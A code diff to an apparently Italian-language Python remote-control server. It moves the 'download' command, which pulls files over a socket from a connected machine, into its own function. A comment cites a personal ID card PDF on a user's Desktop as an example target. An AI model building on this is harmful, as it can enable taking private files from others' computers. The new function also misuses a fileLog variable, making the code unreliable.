@@ -56,6 +56,90 @@ def filespath(clientConnection):
         print("Command Filespath gone wrong\n")
 
 
+def download(comando,clientConnection):
+    nomeFile='null'
+    inizio_file='null'
+    fine_file='null'
+    counter_virgolette=0
+    regex_match = regexcheck_download(comando)
+
+    if regex_match != 'null' and regex_match != 'not matched':
+
+        if regex_match == 'windowstip1'or regex_match == 'unixtip1':
+
+            print(f"Nella download: regex riconosciuta e risulta {regex_match}")
+
+            #tipologia 1: (simile a find) download "nomefile.estensione" path
+            for element in range(0, len(comando)):
+                if comando[element] == "\"":
+                    counter_virgolette += 1
+                    if counter_virgolette == 1:
+                        inizio_file = element+1
+                    elif counter_virgolette == 2:
+                        fine_file = element
+
+        elif regex_match == 'windowstip2' or regex_match == 'unixtip2':
+
+            #tipologia 2: (il risultato di filespath) "Carta di identità cartacea titolare.pdf" nel percorso: /Users/erasmo/Desktop
+            for element in range(0, len(comando)):
+                if comando[element] == "\"":
+                    counter_virgolette += 1
+                    if counter_virgolette == 1:
+                        inizio_file = element+1
+                    elif counter_virgolette == 2:
+                        fine_file = element
+
+        print(f"Risulta nomefile = {comando[inizio_file:fine_file]}")
+
+        try:
+            if inizio_file != 'null' and fine_file != 'null':
+                nomeFile=comando[inizio_file:fine_file]
+                file = open(nomeFile, 'wb')
+                for i in tqdm(range(17), desc=Fore.LIGHTWHITE_EX + f"Downloading {nomeFile}...", colour="green",
+                                ncols=100, bar_format="{desc}: {percentage:3.0f}% {bar}"):
+                    sleep(0.2)
+
+                filerecv = clientConnection.recv(1024)
+
+                try:
+                    fileIf = filerecv.decode(FORMAT)
+                except:
+                    fileIf = ""
+
+                if fileIf[0:7]!="[ERROR]":
+
+                    scritti = 0
+                    while (filerecv):
+                        scritti = scritti + file.write(filerecv)
+                        filerecv = clientConnection.recv(1024)
+                        if filerecv == b'[END]':
+                            filerecv = ''
+
+                    file.close()
+
+                    if os.path.getsize(nomeFile) <= 0:
+                        fileLog = fileLog + "\n" + "Download failed\n" + "\n"
+                        print("Download failed\n")
+                        os.remove(nomeFile)
+                    elif scritti < os.path.getsize(nomeFile):
+                        fileLog = fileLog + "\n" + "Download failed\n" + "\n"
+                        print("Download fallito\n")
+                        os.remove(nomeFile)
+                    else:
+                        fileLog = fileLog + "\n" + f"File {nomeFile} successfully downloaded\n" + "\n"
+                        print(f"File {nomeFile} successfully downloaded\n")
+                    time.sleep(2)
+                else:
+                    raise Exception
+            else:
+                print("Couldn't take start and end point of the file's name")
+        except:
+            #traceback.print_exc()
+            print("Download fallito\n")
+            fileLog = fileLog + "\n" + "Download failed\n"
+    else:
+        print("The input doesn't match the regular expression for download command")
+
 
 # CONTROLLO REMOTO
 def remoteControl(clientConnection,buff):
@@ -162,49 +246,7 @@ def remoteControl(clientConnection,buff):
                 fileLog = fileLog + "\n" + output + "\n"
 
             elif comando[0:8] == "download":
-                try:
-                    nomeFile=comando[10:len(comando) - 1]
-                    file = open(nomeFile, 'wb')
-                    for i in tqdm(range(17), desc=Fore.LIGHTWHITE_EX + f"Downloading {nomeFile}...", colour="green",
-                                  ncols=100, bar_format="{desc}: {percentage:3.0f}% {bar}"):
-                        sleep(0.2)
-
-                    filerecv = clientConnection.recv(1024)
-
-                    try:
-                        fileIf = filerecv.decode(FORMAT)
-                    except:
-                        fileIf = ""
-
-                    if fileIf[0:7]!="[ERROR]":
-
-                        scritti = 0
-                        while (filerecv):
-                            scritti = scritti + file.write(filerecv)
-                            filerecv = clientConnection.recv(1024)
-                            if filerecv == b'[END]':
-                                filerecv = ''
-
-                        file.close()
-
-                        if os.path.getsize(comando[10:len(comando) - 1]) <= 0:
-                            fileLog = fileLog + "\n" + "Download failed\n" + "\n"
-                            print("Download failed\n")
-                            os.remove(nomeFile)
-                        elif scritti < os.path.getsize(nomeFile):
-                            fileLog = fileLog + "\n" + "Download failed\n" + "\n"
-                            print("Download fallito\n")
-                            os.remove(nomeFile)
-                        else:
-                            fileLog = fileLog + "\n" + f"File {nomeFile} successfully downloaded\n" + "\n"
-                            print(f"File {nomeFile} successfully downloaded\n")
-                        time.sleep(2)
-                    else:
-                        raise Exception
-                except:
-                    #traceback.print_exc()
-                    print("Download fallito\n")
-                    fileLog = fileLog + "\n" + "Download failed\n"
+                download(comando,clientConnection)
 
             elif comando[0:4] == "rete" or comando[0:7]=="network":
                 try:
